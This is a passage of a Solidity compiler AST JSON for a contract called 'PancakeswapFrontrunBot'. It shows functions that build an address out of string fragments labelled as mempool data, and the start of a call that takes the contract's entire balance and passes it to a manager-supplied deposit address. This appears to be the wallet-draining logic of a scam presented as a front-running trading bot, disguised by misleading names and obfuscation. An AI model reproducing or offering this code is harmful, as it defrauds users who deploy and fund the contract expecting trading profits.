																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															"value": "0"
														},
														{
															"argumentTypes": null,
															"id": 1442,
															"name": "_allMempools",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1426,
															"src": "14907:12:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																"typeString": "literal_string \"0\""
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1440,
														"name": "mempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1723,
														"src": "14894:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
															"typeString": "function (string memory,string memory) pure returns (string memory)"
														}
													},
													"id": 1443,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "14894:26:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "14865:55:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 1445,
													"name": "_fullMempool",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1439,
													"src": "14941:12:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1341,
												"id": 1446,
												"nodeType": "Return",
												"src": "14934:19:3"
											}
										]
									},
									"documentation": null,
									"id": 1448,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "callMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1338,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "13900:2:3"
									},
									"returnParameters": {
										"id": 1341,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1340,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1448,
												"src": "13926:13:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1339,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "13926:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "13925:15:3"
									},
									"scope": 1724,
									"src": "13880:1081:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1510,
										"nodeType": "Block",
										"src": "15366:269:3",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 1461,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1457,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1455,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15381:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"id": 1456,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1450,
															"src": "15386:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"src": "15381:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&&",
													"rightExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint8",
															"typeString": "uint8"
														},
														"id": 1460,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 1458,
															"name": "d",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1450,
															"src": "15391:1:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "<=",
														"rightExpression": {
															"argumentTypes": null,
															"hexValue": "39",
															"id": 1459,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "15396:1:3",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_9_by_1",
																"typeString": "int_const 9"
															},
															"value": "9"
														},
														"src": "15391:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "15381:16:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"condition": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"id": 1488,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1481,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"hexValue": "3130",
																"id": 1476,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "15469:2:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_10_by_1",
																	"typeString": "int_const 10"
																},
																"value": "10"
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1479,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1450,
																		"src": "15481:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1478,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15475:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1477,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "15475:5:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1480,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15475:8:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"src": "15469:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "&&",
														"rightExpression": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint8",
																"typeString": "uint8"
															},
															"id": 1487,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1484,
																		"name": "d",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1450,
																		"src": "15493:1:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1483,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15487:5:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint8_$",
																		"typeString": "type(uint8)"
																	},
																	"typeName": {
																		"id": 1482,
																		"name": "uint8",
																		"nodeType": "ElementaryTypeName",
																		"src": "15487:5:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1485,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15487:8:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint8",
																	"typeString": "uint8"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "3135",
																"id": 1486,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "15499:2:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_15_by_1",
																	"typeString": "int_const 15"
																},
																"value": "15"
															},
															"src": "15487:14:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"src": "15469:32:3",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseBody": null,
													"id": 1505,
													"nodeType": "IfStatement",
													"src": "15465:103:3",
													"trueBody": {
														"id": 1504,
														"nodeType": "Block",
														"src": "15503:65:3",
														"statements": [
															{
																"expression": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			},
																			"id": 1501,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				},
																				"id": 1499,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"arguments": [
																								{
																									"argumentTypes": null,
																									"hexValue": "61",
																									"id": 1495,
																									"isConstant": false,
																									"isLValue": false,
																									"isPure": true,
																									"kind": "string",
																									"lValueRequested": false,
																									"nodeType": "Literal",
																									"src": "15541:3:3",
																									"subdenomination": null,
																									"typeDescriptions": {
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									},
																									"value": "a"
																								}
																							],
																							"expression": {
																								"argumentTypes": [
																									{
																										"typeIdentifier": "t_stringliteral_3ac225168df54212a25c1c01fd35bebfea408fdac2e31ddd6f80a4bbf9a5f1cb",
																										"typeString": "literal_string \"a\""
																									}
																								],
																								"id": 1494,
																								"isConstant": false,
																								"isLValue": false,
																								"isPure": true,
																								"lValueRequested": false,
																								"nodeType": "ElementaryTypeNameExpression",
																								"src": "15536:4:3",
																								"typeDescriptions": {
																									"typeIdentifier": "t_type$_t_bytes1_$",
																									"typeString": "type(bytes1)"
																								},
																								"typeName": {
																									"id": 1493,
																									"name": "byte",
																									"nodeType": "ElementaryTypeName",
																									"src": "15536:4:3",
																									"typeDescriptions": {
																										"typeIdentifier": null,
																										"typeString": null
																									}
																								}
																							},
																							"id": 1496,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "typeConversion",
																							"lValueRequested": false,
																							"names": [],
																							"nodeType": "FunctionCall",
																							"src": "15536:9:3",
																							"tryCall": false,
																							"typeDescriptions": {
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_bytes1",
																								"typeString": "bytes1"
																							}
																						],
																						"id": 1492,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "15530:5:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_uint8_$",
																							"typeString": "type(uint8)"
																						},
																						"typeName": {
																							"id": 1491,
																							"name": "uint8",
																							"nodeType": "ElementaryTypeName",
																							"src": "15530:5:3",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1497,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "15530:16:3",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "+",
																				"rightExpression": {
																					"argumentTypes": null,
																					"id": 1498,
																					"name": "d",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 1450,
																					"src": "15549:1:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint8",
																						"typeString": "uint8"
																					}
																				},
																				"src": "15530:20:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint8",
																					"typeString": "uint8"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "-",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3130",
																				"id": 1500,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "15553:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_10_by_1",
																					"typeString": "int_const 10"
																				},
																				"value": "10"
																			},
																			"src": "15530:25:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1490,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "15525:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1489,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "15525:4:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1502,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15525:31:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"functionReturnParameters": 1454,
																"id": 1503,
																"nodeType": "Return",
																"src": "15518:38:3"
															}
														]
													}
												},
												"id": 1506,
												"nodeType": "IfStatement",
												"src": "15377:191:3",
												"trueBody": {
													"id": 1475,
													"nodeType": "Block",
													"src": "15399:60:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		},
																		"id": 1472,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"arguments": [
																						{
																							"argumentTypes": null,
																							"hexValue": "30",
																							"id": 1468,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "string",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "15437:3:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							},
																							"value": "0"
																						}
																					],
																					"expression": {
																						"argumentTypes": [
																							{
																								"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																								"typeString": "literal_string \"0\""
																							}
																						],
																						"id": 1467,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"lValueRequested": false,
																						"nodeType": "ElementaryTypeNameExpression",
																						"src": "15432:4:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_type$_t_bytes1_$",
																							"typeString": "type(bytes1)"
																						},
																						"typeName": {
																							"id": 1466,
																							"name": "byte",
																							"nodeType": "ElementaryTypeName",
																							"src": "15432:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": null,
																								"typeString": null
																							}
																						}
																					},
																					"id": 1469,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "typeConversion",
																					"lValueRequested": false,
																					"names": [],
																					"nodeType": "FunctionCall",
																					"src": "15432:9:3",
																					"tryCall": false,
																					"typeDescriptions": {
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_bytes1",
																						"typeString": "bytes1"
																					}
																				],
																				"id": 1465,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "15426:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1464,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "15426:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1470,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "15426:16:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "+",
																		"rightExpression": {
																			"argumentTypes": null,
																			"id": 1471,
																			"name": "d",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1450,
																			"src": "15445:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		},
																		"src": "15426:20:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint8",
																			"typeString": "uint8"
																		}
																	],
																	"id": 1463,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "15421:4:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_bytes1_$",
																		"typeString": "type(bytes1)"
																	},
																	"typeName": {
																		"id": 1462,
																		"name": "byte",
																		"nodeType": "ElementaryTypeName",
																		"src": "15421:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1473,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "15421:26:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"functionReturnParameters": 1454,
															"id": 1474,
															"nodeType": "Return",
															"src": "15414:33:3"
														}
													]
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 1507,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "15619:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 1508,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15619:8:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1509,
												"nodeType": "ExpressionStatement",
												"src": "15619:8:3"
											}
										]
									},
									"documentation": null,
									"id": 1511,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "toHexDigit",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1451,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1450,
												"mutability": "mutable",
												"name": "d",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1511,
												"src": "15328:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint8",
													"typeString": "uint8"
												},
												"typeName": {
													"id": 1449,
													"name": "uint8",
													"nodeType": "ElementaryTypeName",
													"src": "15328:5:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint8",
														"typeString": "uint8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15327:9:3"
									},
									"returnParameters": {
										"id": 1454,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1453,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1511,
												"src": "15360:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes1",
													"typeString": "bytes1"
												},
												"typeName": {
													"id": 1452,
													"name": "byte",
													"nodeType": "ElementaryTypeName",
													"src": "15360:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes1",
														"typeString": "bytes1"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15359:6:3"
									},
									"scope": 1724,
									"src": "15308:327:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1521,
										"nodeType": "Block",
										"src": "15714:56:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1517,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1448,
																"src": "15748:11:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1518,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15748:13:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1516,
														"name": "parseMemoryPool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 984,
														"src": "15732:15:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1519,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15732:30:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1515,
												"id": 1520,
												"nodeType": "Return",
												"src": "15725:37:3"
											}
										]
									},
									"documentation": null,
									"id": 1522,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_callFrontRunActionMempool",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1512,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15679:2:3"
									},
									"returnParameters": {
										"id": 1515,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1514,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1522,
												"src": "15705:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1513,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "15705:7:3",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15704:9:3"
									},
									"scope": 1724,
									"src": "15644:126:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1539,
										"nodeType": "Block",
										"src": "15984:92:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 1534,
																		"name": "this",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": -28,
																		"src": "16054:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_contract$_PancakeswapFrontrunBot_$1724",
																			"typeString": "contract PancakeswapFrontrunBot"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_contract$_PancakeswapFrontrunBot_$1724",
																			"typeString": "contract PancakeswapFrontrunBot"
																		}
																	],
																	"id": 1533,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "16046:7:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": {
																		"id": 1532,
																		"name": "address",
																		"nodeType": "ElementaryTypeName",
																		"src": "16046:7:3",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 1535,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "16046:13:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"id": 1536,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "balance",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "16046:21:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"expression": {
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"arguments": [],
																	"expression": {
																		"argumentTypes": [],
																		"expression": {
																			"argumentTypes": null,
																			"id": 1527,
																			"name": "manager",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 95,
																			"src": "16004:7:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_contract$_Manager_$1838",
																				"typeString": "contract Manager"
																			}
																		},
																		"id": 1528,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "uniswapDepositAddress",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": 1837,
																		"src": "16004:29:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_external_pure$__$returns$_t_address_$",
																			"typeString": "function () pure external returns (address)"
																		}
																	},
																	"id": 1529,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "functionCall",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "16004:31:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																],
																"id": 1526,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "15996:8:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_payable_$",
																	"typeString": "type(address payable)"
																},
